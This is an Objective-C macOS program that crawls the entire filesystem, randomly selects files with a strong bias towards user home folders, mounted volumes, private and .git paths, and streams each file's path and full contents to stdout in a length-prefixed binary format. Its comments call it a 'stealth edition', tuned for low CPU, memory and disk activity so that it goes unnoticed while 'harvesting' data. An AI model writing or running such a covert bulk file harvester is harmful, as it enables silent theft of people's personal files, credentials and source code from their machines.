// The final form (sacrifice speed for extremely low CPU and memory utilisation)
// i.e. stealth eition
// It consistently uses ~30-55% CPU during the high activity (usually for 10-15
// seconds when the process starts) and < 2% during little activity (majority of
// the time it is here), with negligible memory (< 50MB) overall
//
// I don't even know how long Ive had this running for just testing it
// It is slow (by design) but there are no performance issues so it is doing the
// job I need it to
//
// Regarding disk usage, it doesnt cause massive spikes in my testing (somwhow),
// the only statistic it balloons is the total data read (as expected). The
// entire system disk read speed stayed below 60MB/s consistently.

#import <Foundation/Foundation.h>
#import <os/lock.h>

/* ----------------- Producer ----------------- */

@interface Producer : NSObject {
  dispatch_queue_t producerQueue;

  NSFileManager *manager;
}

+ (instancetype)producer;

- (instancetype)init;
- (void)beginWalking;

@end

@implementation Producer

+ (instancetype)producer {
  return [[Producer alloc] init];
}

- (instancetype)init {
  if (self = [super init]) {
    dispatch_queue_attr_t attr = dispatch_queue_attr_make_with_qos_class(
      DISPATCH_QUEUE_SERIAL, QOS_CLASS_DEFAULT, 0);

    producerQueue =
        dispatch_queue_create("p", attr);

    manager = [NSFileManager defaultManager];
  }

  return self;
}

- (void)beginWalking {
  dispatch_async(producerQueue, ^{
    @autoreleasepool {
      NSArray<NSURLResourceKey> *keys =
        @[ NSURLIsRegularFileKey, NSURLIsReadableKey ];
      NSDirectoryEnumerator *enumerator =
          [manager enumeratorAtURL:[NSURL fileURLWithPath:@"/"]
        includingPropertiesForKeys:keys
                           options:NSDirectoryEnumerationSkipsPackageDescendants
                      errorHandler:NULL];

      BOOL skip = false;
      for (NSURL *url in enumerator) {
        skip = false;

        NSDictionary<NSURLResourceKey, id> *resources =
          [url resourceValuesForKeys:keys error:NULL];

        if (![(NSNumber *)[resources objectForKey:NSURLIsReadableKey]
                boolValue]) {
          [enumerator skipDescendants];
          continue; // Skip unreadable
        }

        if (![(NSNumber *)[resources objectForKey:NSURLIsRegularFileKey]
                boolValue]) {
          continue; // Skip directories
        }

        NSString *path = [url path];

        // HEAVILY bias towards not skipping /Volumes or /Users
        if ([path containsString:@"Volumes"] ||
            [path containsString:@"Users"]) {
          skip = arc4random_uniform(8) == 0;
        }

        // Not even we want to harvest node_modules
        if ([path containsString:@"node_modules"]) {
          [enumerator skipDescendants];
          skip = true;
          continue;
        }

        // HEAVILY bias against harvesting local, sbin, bin
        if ([path containsString:@"bin"] ||
            [path containsString:@"local"] ||
            [path containsString:@"sbin"]) {
          skip |= arc4random_uniform(48) != 0;
          if (skip) [enumerator skipDescendants];
        }

        // VERY rarely harvest these
        if ([path containsString:@"Library"]) {
          skip |= arc4random_uniform(36) != 0;
          if (skip) [enumerator skipDescendants];
        }

        // Rarely harvest these
        if ([path containsString:@"dev"] ||
            [path containsString:@".timemachine"] ||
            [path containsString:@"opt"]) {
          skip |= arc4random_uniform(24) != 0;
          if (skip) [enumerator skipDescendants];
        }

        // Rarely harvest these
        if ([path containsString:@"share"] ||
            [path containsString:@"lib"]) {
          skip |= arc4random_uniform(24) != 0;
        }

        // Sometimes harvest these
        if ([path containsString:@"private"] ||
            [path containsString:@".com"] ||
            [path containsString:@".git"]) {
            skip |= arc4random_uniform(12) != 0;
        }
      after:
        if (skip) continue;

        [[NSNotificationCenter defaultCenter]
            postNotificationName:@"CandidateReady"
                          object:self
                        userInfo:@{ @"url": url }];
      }
    }
  });
}

@end

/* ----------------- Consumer ----------------- */

@interface Consumer : NSObject {
  NSOperationQueue *queue;
  os_unfair_lock stdout_lock;

  Producer *inner_producer;
}

+ (instancetype)consumerWithProducer:(Producer *)producer
                         concurrency:(NSInteger)concurrency;

- (instancetype)initWithProducer:(Producer *)producer
                     concurrency:(NSInteger)concurrency;

- (void)beginHarvestmaxxing;

@end

@implementation Consumer

+ (instancetype)consumerWithProducer:(Producer *)producer
                         concurrency:(NSInteger)concurrency
{
  return [[Consumer alloc] initWithProducer:producer
                                concurrency:concurrency];

}

- (instancetype)initWithProducer:(Producer *)producer
                     concurrency:(NSInteger)concurrency
{
  if (self = [super init]) {
    queue = [NSOperationQueue new];
    [queue setName:@"lmnopqueue"];
    [queue setMaxConcurrentOperationCount:concurrency];
    [queue setQualityOfService:NSQualityOfServiceUserInitiated];

    stdout_lock = OS_UNFAIR_LOCK_INIT;
    inner_producer = producer;
  }

  return self;
}

- (void)beginHarvestmaxxing {
  __auto_type harvest = ^(NSNotification *notification) {
    @autoreleasepool {
      NSURL *url = [[notification userInfo] objectForKey:@"url"];

      NSLog(@"!! CANDIDATE SELECTED: %@", [url path]);

      NSNumber *length;
      [url getResourceValue:&length forKey:NSURLFileSizeKey error:NULL];

      NSUInteger len = [length unsignedIntegerValue];
      unsigned char lengthBytesLE[8];
      for (int i = 0; i < 8; i++) {
          lengthBytesLE[i] = (len >> (i * 8)) & 0xFF;
      }

      [NSNumber numberWithUnsignedInteger:1997];

      NSUInteger count = [[url path] length];
      unsigned char countBytesLE[8];
      for (int i = 0; i < 8; i++) {
          countBytesLE[i] = (count >> (i * 8)) & 0xFF;
      }

      int fd = open([[url path] UTF8String], O_RDONLY);

      os_unfair_lock_lock(&stdout_lock);

      write(STDOUT_FILENO, countBytesLE, 8);
      write(STDOUT_FILENO, [[url path] UTF8String], count);
      write(STDOUT_FILENO, lengthBytesLE, 8);

      static unsigned char chunk[64 * 1024];
      ssize_t readBytes;
      while ((readBytes = read(fd, chunk, 64 * 1024)) > 0) {
        write(STDOUT_FILENO, chunk, readBytes);
        usleep(100);
      }

      os_unfair_lock_unlock(&stdout_lock);

      close(fd);
    }
  };

  [[NSNotificationCenter defaultCenter]
      addObserverForName:@"CandidateReady"
                  object:nil
                   queue:queue
              usingBlock:harvest];
}

@end

int main() {
  @autoreleasepool {
    // Create a producer & consumer
    Producer *producer = [Producer producer];
    Consumer *consumer = [Consumer consumerWithProducer:producer
                                            concurrency:16];

    // The consumer will start listening for candidate events
    [consumer beginHarvestmaxxing];

    // Begin the producer
    [producer beginWalking];

    // Run the mainloop
    [[NSRunLoop mainRunLoop] run];
  }
}